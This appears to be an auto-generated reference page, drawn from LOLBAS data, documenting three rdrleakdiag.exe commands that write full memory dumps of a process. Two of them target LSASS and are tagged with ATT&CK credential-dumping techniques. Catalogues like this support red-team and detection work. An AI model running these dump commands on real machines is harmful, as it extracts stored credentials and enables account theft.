---
parsed_by: focuslocust
source: commands
type: generated
---
# rdrleakdiag Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## rdrleakdiag.exe

Tool page: [rdrleakdiag.exe](../../tools/windows/rdrleakdiag.exe.md)

### Dump process by PID.

```text
rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
```

Description:

Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

Related ATT&CK:

- [T1003](../../attack/techniques/T1003-os-credential-dumping.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rdrleakdiag.yml` |
| Evidence | Command preserved from source parser. |

### Dump LSASS process.

```text
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
```

Description:

Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

Related ATT&CK:

- [T1003.001](../../attack/techniques/T1003.001-lsass-memory.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rdrleakdiag.yml` |
| Evidence | Command preserved from source parser. |

### Dump LSASS process mutliple times.

```text
rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap
```

Description:

After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

Related ATT&CK:

- [T1003.001](../../attack/techniques/T1003.001-lsass-memory.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rdrleakdiag.yml` |
| Evidence | Command preserved from source parser. |
